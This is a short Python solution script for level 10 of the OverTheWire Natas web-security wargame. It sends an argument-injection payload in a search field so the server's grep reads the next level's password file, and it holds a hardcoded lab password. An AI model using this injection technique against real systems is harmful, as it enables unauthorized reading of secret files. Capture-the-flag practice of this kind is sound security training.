import requests
import re

username = 'natas10'
password = 'D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE'

url = 'http://%s.natas.labs.overthewire.org/'%username
url1 = 'http://%s.natas.labs.overthewire.org/index-source.html'%username

response = requests.Session()

response = response.post(url , data={"needle" : ".* /etc/natas_webpass/natas11 #"} , auth=(username,password))
content = response.text

flag = re.findall("/etc/natas_webpass/natas11:(.*)",content)[0]
print(flag)